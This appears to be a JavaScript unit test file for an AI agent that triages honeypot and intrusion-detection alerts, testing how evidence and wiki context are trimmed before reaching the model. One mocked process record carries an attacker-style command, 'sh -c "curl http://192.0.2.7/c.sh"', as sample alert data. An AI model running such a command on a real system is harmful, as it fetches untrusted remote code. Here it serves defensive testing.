// P003-T039 单测：上下文瘦身各条改动各自可验（判端在模型实际收到的 messages / tools 上）。
// 跑法：node --test evidence/test/P003-T039/context-slim.test.js
// 纪律：不碰网络、不碰真实时钟、不作真实模型调用；每条都在几十毫秒内跑完。
import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { Worker } from 'node:worker_threads';
import { AgentToolbox } from '../../../agent-tools.js';
import { InvestigationAgent } from '../../../investigation-agent.js';
import { WikiStore, pageExcerpts, pageSummary } from '../../../wiki-store.js';
import { boundSyslogView, compactEvidenceView, projectEvidence } from '../../../evidence-view.js';

const wiki = new WikiStore(path.join(path.dirname(fileURLToPath(import.meta.url)), '..', '..', '..', 'wiki'));

// 一条蜜罐告警：事件带 61 行时间线（其中 2 行有响应长度、12 行带 HTTP 请求摘要）。
const httpLine = index => Buffer.from(`GET /admin/${index} HTTP/1.1\r\nHost: 10.0.0.5\r\n\r\n`).toString('base64');
const event = () => ({ event_id: 7, id: 7, host_id: 41, host_view: { host_id: 41, host_ip: '10.0.0.5' },
  source_ip: '192.0.2.7', address: '10.0.0.5:80', level: '高', created_at: 1793600000,
  timeline: Array.from({ length: 61 }, (_, index) => ({ timestamp: 1793600000 + index, src_addr: '192.0.2.7',
    request_length: index % 2 ? 0 : 20, response_length: index === 46 ? 512 : 0,
    response_digest: index % 5 === 0 ? httpLine(index) : '' })) });

const catalog = () => [
  { name: 'get_honeypot_event', inputSchema: { type: 'object', properties: { id: { type: 'number' } }, required: ['id'] } },
  { name: 'list_honeypot_events', inputSchema: { type: 'object', properties: { source_ip: {}, count: {} } } },
  { name: 'list_host_events', inputSchema: { type: 'object', properties: { host_id: {}, count: {} } } },
  { name: 'list_process_assets', inputSchema: { type: 'object', properties: { filters: {}, count: {} } } },
  { name: 'list_host_assets', inputSchema: { type: 'object', properties: { host_ip: {}, count: {} } } },
  { name: 'get_process_asset', inputSchema: { type: 'object', properties: { id: { type: 'number' } }, required: ['id'] } },
  { name: 'list_port_assets', inputSchema: { type: 'object', properties: { filters: {}, count: {} } } }
];

const results = {
  get_honeypot_event: event,
  list_honeypot_events: () => ({ total: 1, events: [event()] }),
  list_host_events: () => ({ total: 3, events: [{ id: 100, host_view: { host_id: 41 },
    cmdline: 'id', source_ip: '192.0.2.7', process_tree: Array.from({ length: 10 }, (_, row) => ({ pid: 1000 + row,
      ppid: 999, pname: `p-${row}`, exename: '/usr/bin/x', uname: 'www', uid: 33, euname: 'www', euid: 33,
      cmdline: 'sh -c "curl http://192.0.2.7/c.sh"', start_time: 1793600000 })) }] }),
  list_process_assets: () => ({ total: 1, result: [{ id: 300, host_info: { id: 41 }, name: 'nginx',
    pid: 1200, ppid: 1, cmdline: 'nginx: worker', user: 'www', path: '/usr/sbin/nginx' }] }),
  list_host_assets: () => ({ total: 1, events: [{ id: 41, host_ip: '10.0.0.5', host_name: 'web-05' }] }),
  get_process_asset: () => ({ ID: 300, collect_time: 1793600000, host_info: { id: 41, host_ip: '10.0.0.5' },
    process_info: { id: 300, name: 'nginx', pid: 1200, cmdline: 'nginx: worker', user: 'www', path: '/usr/sbin/nginx' },
    file_info: { id: 44, path: '/usr/sbin/nginx', md5: 'f'.repeat(32), sha256: 'a'.repeat(64), safety: 'trusted' } }),
  list_port_assets: () => ({ total: 1, result: [{ id: 500, host_info: { id: 41 }, port: 80, cmd: 'nginx' }] })
};

function toolbox() {
  return new AgentToolbox({ listTools: async () => catalog(),
    callTool: async name => (results[name] ? results[name]() : { total: 0, events: [] }) });
}

const streamContext = () => ({
  parsed: { msgid: 'cloudwalker-honeypot', payload_format: 'keyvalue',
    payload: { event_id: '7', host_id: '41', host_ip: '10.0.0.5', source_ip: '192.0.2.7', target_port: '80' } },
  context: {},
  match: { matched: true, type: 'honeypot', alert_id: 'honeypot:7', event_id: 7, event: event(),
    gap_seconds: 12, candidates: 1, coverage: { returned: 1, total: 1, exact_event_id: true } },
  caseInfo: { case_dir: '/tmp/hids-unit-case', files: ['00-这是什么.md', '03-研判事实.md'] }
});

const conclusion = () => ({ content: JSON.stringify({ verdict: '存疑', confidence: '低', summary: '蜜罐探测试验',
  claims: [{ text: '来源 192.0.2.7', citations: [{ evidence_id: 'cw:1', pointer: '/source_ip', value: '192.0.2.7' }] }],
  missing_data: [] }) });

const batches = [
  [{ name: 'list_host_events', arguments: { host_id: 41, count: 5 } },
    { name: 'list_process_assets', arguments: { filters: { host_id: [41] }, count: 5 } }],
  [{ name: 'list_honeypot_events', arguments: { source_ip: '192.0.2.7', count: 5 } },
    { name: 'list_host_assets', arguments: { host_ip: '10.0.0.5', count: 5 } }],
  [{ name: 'get_process_asset', arguments: { id: 300 } },
    { name: 'list_port_assets', arguments: { filters: { host_id: [41] }, count: 5 } }],
  [{ name: 'list_host_events', arguments: { host_id: 41, count: 3 } },
    { name: 'list_process_assets', arguments: { filters: { host_id: [41] }, count: 3 } }]
];

// 与体积 harness 同一个脚本形状：三批工具轮 → 内容结论 → 独立复核。
function runAgent({ withWiki = true, script = null } = {}) {
  const requests = [];
  const model = { model: 'fake', complete: async (messages, tools) => {
    // 快照：messages 数组会被后续轮次就地折叠，记录里必须留下「这次请求实际发出去的内容」。
    requests.push({ messages: messages.map(message => ({ ...message })), tools });
    const first = String(messages[0]?.content || '');
    const last = String(messages.at(-1)?.content || '');
    if (first.startsWith('你是独立质疑者')) {
      return { content: JSON.stringify({ assessment: 'supported', concerns: [], missing_evidence: [] }) };
    }
    if (script) return script({ messages, tools, requests });
    if (last.startsWith('请根据以下已查询证据')) return conclusion();
    const batch = batches[requests.length - 1];
    if (batch) {
      return { tool_calls: batch.map((call, index) => ({ id: `call-${requests.length}-${index}`, type: 'function',
        function: { name: call.name, arguments: JSON.stringify(call.arguments) } })) };
    }
    return conclusion();
  } };
  const knowledgeStore = withWiki ? {
    agentIndex: (...args) => wiki.agentIndex(...args),
    agentContextPages: (...args) => wiki.agentContextPages(...args),
    agentPage: (...args) => wiki.agentPage(...args),
    agentSearch: (...args) => wiki.agentSearch(...args),
    publishedFor: async () => []
  } : null;
  const agent = new InvestigationAgent(toolbox(), model, undefined, knowledgeStore);
  return { agent, requests, streamContext: streamContext() };
}

const firstUser = requests => String(requests[0].messages[1].content);
const reviewRequest = requests => requests.find(request => String(request.messages[0].content).startsWith('你是独立质疑者'));
const finalRequest = requests => requests.find(request => String(request.messages.at(-1).content).startsWith('请根据以下已查询证据'));
const toolMessages = request => request.messages.filter(message => message.role === 'tool');

test('A1 首轮与终局轮都不内联 match.event，只留匹配元信息', async () => {
  const { agent, requests, streamContext: context } = runAgent();
  const result = await agent.run('honeypot:7', { mode: 'triage', streamContext: context });
  assert.equal(result.verdict.verdict, 'uncertain');
  // match.event 是整条事件原文（含 61 行时间线）；精简视图只留 8 行，两者行数一看就分得开。
  const rows = text => (text.match(/"src_addr"/g) || []).length;
  const user = firstUser(requests);
  assert.equal(user.includes('"event":{'), false);
  assert.ok(rows(user) <= 8, `首轮 user 里时间线行数 ${rows(user)}`);
  assert.match(user, /"gap_seconds":12/);
  const finalUser = String(finalRequest(requests).messages.at(-1).content);
  assert.equal(finalUser.includes('"event":{'), false);
  assert.ok(rows(finalUser) <= 8, `终局轮 user 里时间线行数 ${rows(finalUser)}`);
  assert.match(finalUser, /"gap_seconds":12/);
});

test('A3 首轮必查项只带 id/status/returned_count/total，不带 scope/reason/视图', async () => {
  const { agent, requests, streamContext: context } = runAgent();
  await agent.run('honeypot:7', { mode: 'triage', streamContext: context });
  const user = firstUser(requests);
  const status = JSON.parse(user.slice(user.indexOf('必查项查询状态：') + '必查项查询状态：'.length,
    user.indexOf('。需要看某项的具体记录')));
  assert.ok(status.length >= 2);
  for (const item of status) {
    assert.deepEqual(Object.keys(item).sort(), ['id', 'returned_count', 'status', 'total']);
  }
  assert.equal(user.includes('已取到的必查证据视图'), false);
  assert.equal(/"scope":/.test(user), false);
});

test('A4 常驻 Wiki 页只给编号/标题/要点，wiki_page 返回摘要与命中段', async () => {
  const { agent, requests, streamContext: context } = runAgent({ script: ({ messages, requests: seen }) => {
    const first = String(messages[0].content);
    if (first.startsWith('你是独立质疑者')) {
      return { content: JSON.stringify({ assessment: 'supported', concerns: [], missing_evidence: [] }) };
    }
    if (String(messages.at(-1).content).startsWith('请根据以下已查询证据')) return conclusion();
    if (seen.length === 1) {
      return { tool_calls: [{ id: 'wiki-1', type: 'function',
        function: { name: 'wiki_page', arguments: JSON.stringify({ id: 'HP-10' }) } }] };
    }
    return conclusion();
  } });
  await agent.run('honeypot:7', { mode: 'triage', streamContext: context });
  const user = firstUser(requests);
  // 常驻页：有编号、标题、摘要，但没有整页正文（HP-10 的 SOP 对照段不该整段出现）。
  assert.match(user, /HP-10/);
  assert.match(user, /"summary":/);
  assert.equal(user.includes('sops/honeypot/SOP.md'), false);
  // wiki_page 的返回：摘要 + 命中段，不带整页 content 字段。
  const pageReply = requests[1].messages.filter(message => message.role === 'tool').at(-1);
  const page = JSON.parse(pageReply.content);
  assert.equal(page.id, 'HP-10');
  assert.match(page.summary, /要回答/);
  assert.ok(Array.isArray(page.hits) && page.hits.length >= 1);
  assert.equal(page.content, undefined);
});

test('A5 历史工具结果只留最近 2 条全文，更早的折叠；read_evidence 能取回完整视图', async () => {
  const readBack = [];
  const { agent, requests, streamContext: context } = runAgent({ script: ({ messages, tools, requests: seen }) => {
    const first = String(messages[0].content);
    const last = String(messages.at(-1).content);
    if (first.startsWith('你是独立质疑者')) {
      return { content: JSON.stringify({ assessment: 'supported', concerns: [], missing_evidence: [] }) };
    }
    if (last.startsWith('请根据以下已查询证据')) return conclusion();
    const turn = seen.length;
    if (turn === 1) return { tool_calls: [{ id: 'fold-1', type: 'function',
      function: { name: 'list_host_events', arguments: JSON.stringify({ host_id: 41, count: 5 }) } }] };
    if (turn === 2) return { tool_calls: [{ id: 'fold-2', type: 'function',
      function: { name: 'list_process_assets', arguments: JSON.stringify({ filters: { host_id: [41] }, count: 5 }) } }] };
    if (turn === 3) return { tool_calls: [{ id: 'fold-3', type: 'function',
      function: { name: 'list_host_assets', arguments: JSON.stringify({ host_ip: '10.0.0.5', count: 5 }) } }] };
    if (turn === 4) {
      // 最早那条工具结果的编号由会话分配（必查项先占号），从历史里读回来再用它取证。
      const firstResult = messages.filter(message => message.role === 'tool')[0];
      const evidenceId = JSON.parse(String(firstResult.content)).evidence_id;
      return { tool_calls: [{ id: 'read-1', type: 'function',
        function: { name: 'read_evidence', arguments: JSON.stringify({ evidence_id: evidenceId }) } }] };
    }
    readBack.push(JSON.parse(String(messages.at(-1).content)));
    return conclusion();
  } });
  await agent.run('honeypot:7', { mode: 'triage', streamContext: context });
  // 第 4 次请求时历史里已有 3 条工具结果：最早那条被折叠，最近 2 条仍是全文。
  const history = toolMessages(requests[3]);
  assert.ok(history.length >= 3);
  const folded = history.map(message => JSON.parse(message.content)).filter(content => content.folded);
  assert.equal(folded.length, 1);
  const firstEvidenceId = folded[0].evidence_id;
  assert.match(firstEvidenceId, /^cw:\d+$/);
  assert.match(folded[0].note, /read_evidence/);
  // 折叠只发生在历史里，证据本身还在会话里：read_evidence 取回的编号就是它。
  assert.equal(JSON.parse(String(history.at(-1).content)).evidence_id === firstEvidenceId, false);
  assert.equal(history.at(-1).content.includes('folded'), false);
  // read_evidence 取回的是那次工具结果的完整视图（含 view），而不是摘要。
  assert.equal(readBack.length, 1);
  assert.equal(readBack[0].evidence_id, firstEvidenceId);
  assert.equal(typeof readBack[0].view, 'object');
  assert.match(JSON.stringify(readBack[0].view), /returned_count/);
});

test('A6 嵌套序列裁到 timeline 8 行 / commands 4 行，计数保留，值得看的行不丢', () => {
  const view = projectEvidence('get_honeypot_event', event());
  const compacted = compactEvidenceView(view);
  const timeline = compacted.related_sequences.timeline;
  assert.equal(timeline.total_in_record, 61);
  assert.equal(timeline.shown_count, 8);
  assert.equal(timeline.shown.length, 8);
  // 有响应长度的行（index 46）优先留下：裁展示行不能把关键行裁掉。
  assert.equal(timeline.shown.some(row => row.index === 46), true);
  assert.equal(timeline.nonempty_request_count, view.related_sequences.timeline.nonempty_request_count);
  assert.equal(timeline.nonzero_response_count, 1);
  // commands：12 行裁到 4 行，头尾各留一半，总数不变。
  const commandView = { kind: 'detail', tool: 'get_full_command', facts: {},
    related_sequences: { commands: { total_in_record: 12, shown_count: 12,
      shown: Array.from({ length: 12 }, (_, index) => ({ index, facts: { seq: { value: index } } })) } } };
  const compactedCommands = compactEvidenceView(commandView).related_sequences.commands;
  assert.equal(compactedCommands.total_in_record, 12);
  assert.equal(compactedCommands.shown_count, 4);
  assert.deepEqual(compactedCommands.shown.map(row => row.index), [0, 1, 10, 11]);
});

test('A6 syslog:1 视图有长度上限：超长字段整条省略、长值截断，短值原样保留', () => {
  // 情况一：有一条超长命令（4000 字）——整条省略，能引用的短值一个字不动。
  const bounded = boundSyslogView({ msgid: 'cloudwalker-honeypot',
    payload: { host_ip: '10.0.0.5', process_command_line: 'x'.repeat(4000) } });
  assert.equal(bounded.msgid, 'cloudwalker-honeypot');
  assert.ok(JSON.stringify(bounded).length <= 3000);
  assert.equal(bounded.payload.host_ip, '10.0.0.5');
  assert.deepEqual(bounded.omitted_fields, ['process_command_line']);
  assert.equal(bounded.truncated_for_context, true);
  // 情况二：每条都不超 600 字但总量超限——截断最长的值，字段名一个不丢。
  const wide = boundSyslogView({ msgid: 'm',
    payload: Object.fromEntries(Array.from({ length: 8 }, (_, index) => [`field_${index}`, 'z'.repeat(500)])) });
  assert.ok(JSON.stringify(wide).length <= 3000);
  assert.equal(Object.keys(wide.payload).length, 8);
  assert.ok(wide.truncated_fields.length >= 1);
  assert.match(wide.payload[wide.truncated_fields[0]], /截断，原 500 字/);
  // 不超限就原样返回，不动内容。
  const small = { msgid: 'm', payload: { host_ip: '10.0.0.5' } };
  assert.deepEqual(boundSyslogView(small), small);
});

test('A2 复核轮与结论轮同一口径：完整视图 ≤4000 字，超出的只给编号与计数摘要', async () => {
  const { agent, requests, streamContext: context } = runAgent();
  await agent.run('honeypot:7', { mode: 'triage', streamContext: context });
  for (const request of [reviewRequest(requests), finalRequest(requests)]) {
    const user = String(request.messages.at(-1).content);
    const evidence = JSON.parse(user.slice(user.indexOf('\n{') + 1)).evidence;
    const full = evidence.filter(item => !item.omitted_for_context);
    const omitted = evidence.filter(item => item.omitted_for_context);
    assert.ok(full.length <= 5);
    assert.ok(omitted.length >= 1);
    for (const item of full) assert.ok(JSON.stringify(item.view).length <= 4000);
    for (const item of omitted) {
      assert.equal(item.view, undefined);
      assert.equal(typeof item.summary, 'object');
    }
  }
});

test('A8 Wiki 摘要与命中段：摘要取首段要点，命中段按关键词或判定用语取', () => {
  const page = ['# 判定页', '',
    '**要回答**：这次触碰是探测还是利用。', '',
    '1. **取事实**：来源 IP、时间线、载荷。', '',
    '2. **结论**：有利用证据判真实威胁；登记过的演练判误报；其余判存疑。'].join('\n');
  assert.match(pageSummary(page), /要回答/);
  const judged = pageExcerpts(page);
  assert.equal(judged.length >= 1, true);
  assert.match(JSON.stringify(judged), /结论/);
  const keyword = pageExcerpts(page, { keyword: '载荷' });
  assert.equal(keyword.length, 1);
  assert.match(keyword[0].text, /取事实/);
});

test('A8 triage 提示词不再重复 submit_conclusion 的字段模板', async () => {
  const { PromptStore } = await import('../../../prompt-store.js');
  const prompts = await new PromptStore(path.join(path.dirname(fileURLToPath(import.meta.url)), 'no-overrides.json')).load();
  assert.equal(/"false_positive_reason":/.test(prompts.prompts.triage), false);
  assert.match(prompts.prompts.triage, /submit_conclusion/);
  // 字段契约仍然由工具 schema 给：模板删了不等于契约丢了。
  assert.match(prompts.prompts.triage, /以该工具的 schema 为准/);
});

// 复审 BUG1：裁剪必须在有限步内收敛。同步死循环会饿死事件循环，`node:test` 的 timeout 根本不触发，
// 所以把它扔进 worker，看门狗超时就判红——这样回归时是一条失败用例，而不是整柜测试一起挂住。
const evidenceViewUrl = new URL('../../../evidence-view.js', import.meta.url).href;
function boundSyslogViewInWorker(view, timeoutMs = 2000) {
  const worker = new Worker(`
    const { parentPort, workerData } = require('node:worker_threads');
    import(workerData.moduleUrl).then(({ boundSyslogView }) => {
      const result = boundSyslogView(workerData.view);
      parentPort.postMessage({ result, length: JSON.stringify(result).length });
    }, error => parentPort.postMessage({ error: String(error && error.stack || error) }));
  `, { eval: true, workerData: { moduleUrl: evidenceViewUrl, view } });
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      worker.terminate();
      reject(new Error(`boundSyslogView 在 ${timeoutMs}ms 内没有返回（裁剪循环不收敛）`));
    }, timeoutMs);
    worker.once('message', message => { clearTimeout(timer); worker.terminate(); resolve(message); });
    worker.once('error', error => { clearTimeout(timer); reject(error); });
  });
}

test('复审 BUG1 syslog 视图：字段多而短、总量超限时裁剪收敛且仍在限内', async () => {
  // 40 个短字段（每条 100 字）：总量 3800+ 超限，但没有一条超 600 字的长字段——
  // 旧实现第二段截断会反复截同一个字段、长度不再下降，5 秒挂死（判词 blocker）。
  const wide = { msgid: 'm', payload: Object.fromEntries(Array.from({ length: 40 }, (_, index) => [`field_${index}`, 'z'.repeat(100)])) };
  const { result, length, error } = await boundSyslogViewInWorker(wide);
  assert.equal(error, undefined, `worker 报错：${error}`);
  assert.ok(length <= 3000, `裁剪后仍有 ${length} 字`);
  assert.equal(result.truncated_for_context, true);
  // 能进限的短值原样保留（模型要拿它填 citations.value）；被整条省略的字段名一个不丢。
  const kept = Object.entries(result.payload);
  assert.ok(kept.length > 0);
  for (const [, value] of kept) assert.equal(value, 'z'.repeat(100));
  assert.equal(kept.length + result.omitted_fields.length, 40);
  assert.equal(result.msgid, 'm');
});

test('复审 BUG2 重复查询不覆写证据正文：read_evidence 取回含 view 的完整视图，折叠摘要不空', async () => {
  const readBack = [];
  const seenIds = [];
  const query = { host_id: 41, count: 5 };
  const { agent, requests, streamContext: context } = runAgent({ withWiki: false, script: ({ messages, requests: seen }) => {
    if (String(messages[0].content).startsWith('你是独立质疑者')) {
      return { content: JSON.stringify({ assessment: 'supported', concerns: [], missing_evidence: [] }) };
    }
    if (String(messages.at(-1).content).startsWith('请根据以下已查询证据')) return conclusion();
    const turn = seen.length;
    const call = (id, name, args) => ({ id, type: 'function', function: { name, arguments: JSON.stringify(args) } });
    const toolContents = () => messages.filter(message => message.role === 'tool').map(message => JSON.parse(String(message.content)));
    // 同一查询连发两次：第二次命中已取证据，回 already_queried 指针（带同一个 evidence_id）。
    if (turn === 1 || turn === 2) return { tool_calls: [call(`dup-${turn}`, 'list_host_events', query)] };
    if (turn === 3) {
      // 真结果与指针都还在历史里：前者给 viewed 计数，后者给要取回的编号。
      const contents = toolContents();
      seenIds.push(contents.find(content => !content.already_queried && content.view)?.view.returned_count,
        contents.find(content => content.already_queried)?.evidence_id);
      return { tool_calls: [call('more-1', 'list_process_assets', { filters: { host_id: [41] }, count: 5 })] };
    }
    if (turn === 4) {
      // 同一批里再取一条 + 用 already_queried 回包里那个编号取回（判词里复现的路径）。
      return { tool_calls: [call('more-2', 'list_host_assets', { host_ip: '10.0.0.5', count: 5 }),
        call('read-back', 'read_evidence', { evidence_id: seenIds[1] })] };
    }
    readBack.push(JSON.parse(String(messages.at(-1).content)));
    return conclusion();
  } });
  await agent.run('honeypot:7', { mode: 'triage', streamContext: context });
  const [realReturnedCount, pointerId] = seenIds;
  assert.equal(typeof realReturnedCount, 'number');
  assert.match(pointerId, /^cw:\d+$/);
  // 第 5 次请求时历史里已有 3 条按证据注册的工具结果（指针不算证据，不占折叠名额）：最早那条被折叠，
  // 折叠摘要取的是**原始全文**而不是后来那条指针——这正是判词里复现的覆写路径。
  const history = toolMessages(requests[4]).map(message => JSON.parse(message.content));
  const folded = history.filter(content => content.folded);
  const foldedTarget = folded.find(content => content.evidence_id === pointerId);
  assert.ok(foldedTarget, '最早那条证据应被折叠');
  assert.equal(foldedTarget.summary.returned_count, realReturnedCount);
  // 指针回包本身还在历史里（内容极小，不需要折叠），模型仍看得到「这条已经取过」。
  assert.equal(history.some(content => content.already_queried === true), true);
  // read_evidence 必须取回带 view 的完整视图，不能把 already_queried 指针回给模型。
  assert.equal(readBack.length, 1);
  assert.equal(readBack[0].already_queried, undefined);
  assert.equal(typeof readBack[0].view, 'object');
  assert.equal(readBack[0].view.returned_count, realReturnedCount);
});

test('复审 BUG3 wiki_page schema 与实现一致：描述是摘要+命中段，带可选 keyword', async () => {
  const { agent, requests, streamContext: context } = runAgent();
  await agent.run('honeypot:7', { mode: 'triage', streamContext: context });
  const spec = requests[0].tools.map(tool => tool.function).find(fn => fn.name === 'wiki_page');
  assert.ok(spec, '模型侧工具表里应有 wiki_page');
  assert.match(spec.description, /摘要/);
  assert.match(spec.description, /命中段/);
  assert.equal(spec.description.includes('完整 Wiki 页面'), false);
  assert.equal(spec.parameters.properties.keyword.type, 'string');
  assert.deepEqual(spec.parameters.required, ['id']);
});
